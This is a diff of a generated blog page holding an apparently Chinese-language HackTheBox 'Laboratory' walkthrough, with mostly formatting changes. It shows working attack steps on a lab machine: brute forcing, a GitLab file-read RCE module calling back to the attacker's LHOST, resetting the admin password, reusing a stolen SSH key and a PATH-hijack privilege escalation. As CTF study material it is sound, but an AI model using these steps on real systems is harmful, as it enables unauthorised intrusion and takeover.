@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -283,8 +283,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate <span class="m">10000</span> -A -p- -T4 10.10.10.216
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --min-rate <span class="m">10000</span> -A -p- -T4 10.10.10.216
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
 <pre tabindex="0"><code>PORT    STATE SERVICE  VERSION
@@ -313,8 +313,8 @@ Aggressive OS guesses: Linux 4.15 - 5.6 (91%), Linux 5.0 (91%), Linux 5.0 - 5.4 
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">hydra -l root -P /usr/share/wordlists/fasttrack.txt 10.10.10.216 ssh -v
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hydra -l root -P /usr/share/wordlists/fasttrack.txt 10.10.10.216 ssh -v
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>返回<code>[ERROR] target ssh://10.10.10.216:22/ does not support password authentication (method reply 4).</code></p>
 <p>判断使用公私钥认证登录，这样就无法对22端口进行爆破。</p>
@@ -330,8 +330,8 @@ Aggressive OS guesses: Linux 4.15 - 5.6 (91%), Linux 5.0 (91%), Linux 5.0 - 5.4 
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">searchsploit gitlab
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit gitlab
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>找到12.9.0的任意文件读取漏洞，但是自带的脚本无法使用，不过知道漏洞已经方便了很多。</p>
 <p>继续收集信息，在explore路由发现了<code>laboratory.htb</code>站点的源码，但是没啥用emmm</p>
@@ -350,16 +350,16 @@ Aggressive OS guesses: Linux 4.15 - 5.6 (91%), Linux 5.0 (91%), Linux 5.0 - 5.4 
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">use exploit/multi/http/gitlab_file_read_rce
-<span class="nb">set</span> VHOST git.laboratory.htb
-<span class="nb">set</span> PASSWORD admin123
-<span class="nb">set</span> USERNAME admin123
-<span class="nb">set</span> RHOSTS 10.10.10.216
-<span class="nb">set</span> RPORT <span class="m">443</span>
-<span class="nb">set</span> SSL <span class="nb">true</span>
-<span class="nb">set</span> LHOST 10.10.14.29 <span class="c1"># 此IP为HTB-access页面提供的IP</span>
-run
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/http/gitlab_file_read_rce
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> VHOST git.laboratory.htb
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> PASSWORD admin123
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> USERNAME admin123
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 10.10.10.216
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RPORT <span class="m">443</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> SSL <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 10.10.14.29 <span class="c1"># 此IP为HTB-access页面提供的IP</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>成功getshell。但是只是git权限，几乎等于没有。。。</p>
 <p>使用<code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>生成交互式终端，不过只有输入命令之后才会回显终端并执行命令，这种情况我也没遇到过。。</p>
@@ -370,8 +370,8 @@ run
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 cve_2020_10977.py https://git.laboratory.htb/ admin123 admin123
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 cve_2020_10977.py https://git.laboratory.htb/ admin123 admin123
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>但是不存在authorized_keys文件，暂时还是没办法登录ssh。</p>
 <p>剩下的getshell流程参考<a href="https://0xaniket.medium.com/laboratory-hackthebox-walkthrough-2d5cfa8c3244" target="_blank" rel="noopener">https://0xaniket.medium.com/laboratory-hackthebox-walkthrough-2d5cfa8c3244</a>，懒得写了。。。</p>
@@ -386,11 +386,11 @@ run
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gitlab-rails console -e production <span class="c1"># 进入控制台</span>
-<span class="nv">user</span> <span class="o">=</span> User.where<span class="o">(</span>id:1<span class="o">)</span>.first <span class="c1"># 获得用户名 dexter</span>
-user.password <span class="o">=</span> <span class="s2">&#34;admin123&#34;</span>
-user.save!
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gitlab-rails console -e production <span class="c1"># 进入控制台</span>
+</span></span><span class="line"><span class="cl"><span class="nv">user</span> <span class="o">=</span> User.where<span class="o">(</span>id:1<span class="o">)</span>.first <span class="c1"># 获得用户名 dexter</span>
+</span></span><span class="line"><span class="cl">user.password <span class="o">=</span> <span class="s2">&#34;admin123&#34;</span>
+</span></span><span class="line"><span class="cl">user.save!
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>成功登录。在仓库里面获得id_rsa，ssh登录：</p>
 <div class="highlight"><div class="chroma">
@@ -400,10 +400,10 @@ user.save!
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">chmod <span class="m">600</span> id_rsa <span class="c1"># 修改私钥权限</span>
-ssh -i id_rsa dexter@laboratory.htb
-cat user.txt <span class="c1"># 获得user flag</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod <span class="m">600</span> id_rsa <span class="c1"># 修改私钥权限</span>
+</span></span><span class="line"><span class="cl">ssh -i id_rsa dexter@laboratory.htb
+</span></span><span class="line"><span class="cl">cat user.txt <span class="c1"># 获得user flag</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="提权"><a href="#提权" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:提权" class="headings">提权</a></h3>
 <p>做到一半被搅屎了，LinEnum.sh文件不知道被谁删了。。(虽然我看过，也没找到啥有用的东西)</p>
@@ -428,11 +428,11 @@ chmod 660 /var/run/docker.sock
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/chmod
-chmod +x chmod
-<span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> <span class="c1"># 修改环境变量路径信息</span>
-/usr/local/bin/docker-security <span class="c1"># 执行二进制文件</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/chmod
+</span></span><span class="line"><span class="cl">chmod +x chmod
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> <span class="c1"># 修改环境变量路径信息</span>
+</span></span><span class="line"><span class="cl">/usr/local/bin/docker-security <span class="c1"># 执行二进制文件</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>成功提升为root权限。</p>
 <p>最后<code>cat /root/root.txt</code>获得root flag。</p>
